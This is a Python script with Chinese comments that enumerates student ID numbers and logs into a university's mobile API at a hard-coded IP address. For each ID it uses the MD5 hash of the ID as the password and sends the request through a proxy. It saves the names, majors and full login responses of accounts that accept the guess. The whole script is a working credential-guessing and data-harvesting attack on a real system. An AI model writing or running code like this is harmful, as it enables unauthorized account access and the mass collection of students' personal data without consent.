# ~/annaconda3/bin/python3.6
# -*- coding:utf-8 -*-
'''
__author__ = 'XD'
__mtime__ = 18-7-28
__IDE__ = PyCharm
Fix the Problem, Not the Blame.
'''
# ~/annaconda3/bin/python3.6
# -*- coding:utf-8 -*-
'''
__author__ = 'XD'
__mtime__ = 18-7-27
__IDE__ = PyCharm
Fix the Problem, Not the Blame.
'''
import hashlib
import requests
import json
import pprint
import threading
import json


def get_token_text(student_num):
    '''
    获取动态的token
    :param student_num: 学号
    :return: str
    '''
    # mod5加密, 传入头
    proxy = {'http': 'http://219.141.153.3'}
    p_text = hashlib.md5(student_num.encode('utf-8')).hexdigest()
    header = {'Content-Type': 'application/json; charset=utf-8',
              'User-Agent': 'okhttp/3.3.1'
              }
    data = {
        "u": student_num,
        "p": p_text
    }
    url = 'http://42.244.42.160/university-facade/Murp/Login'
    # 访问
    response = requests.post(url, data=json.dumps(data), headers=header, proxies=proxy)
    return json.loads(response.text)


def main():
    # 获取已经爬去的学号
    with open('./data/all_students.txt') as f:
        is_students_num_l = []
        for i in f.readlines():
            is_students_num_l.append(i.split()[0])
    # 获取已知的学院专业
    with open('./data/is_students.txt') as f:
        for num in f.readlines():
            # 获取已知的专业学号
            num_l = num.split()  # 分割数据
            student_num = num_l[0]
            major = num_l[2]
            # 重新构建学号
            student_num = student_num[:-3]
            count = 0
            for i in range(1, 301):
                # 如果不存在已经爬好的数据， 才可以继续使用
                if student_num + '{:03}'.format(i) not in is_students_num_l:
                    # 如果错误太多， 说明遍历完成， 跳出循环
                    if count > 20:
                        print('###错误太多， 跳出此专业')
                        break
                    # 假设学号上限为200
                    logging = get_token_text(student_num + '{:03}'.format(i))
                    logging_state = logging['state']
                    if logging_state == 200:
                        with open('./data/all_students_1.txt', 'a') as f:
                            name = logging['data']['name']
                            num = logging['data']['xh']
                            f.write(num + ' ' + name + ' ' + major + ' ' + str(logging) + '\n')
                            print(num + ' ' + name + ' ' + major + ' ' + str(logging))
                    else:
                        count += 1
                        with open('./data/not_all_students.txt', 'a') as f:
                            f.write(
                                '***错误' + student_num + '{:03}'.format(i) + '{:03}'.format(i) + ' ' + str(logging) + '\n')
                            print('***错误' + student_num + '{:03}'.format(i), logging)
                else:
                    print(student_num + '{:03}'.format(i), '已经获取')

if __name__ == '__main__':
    main()
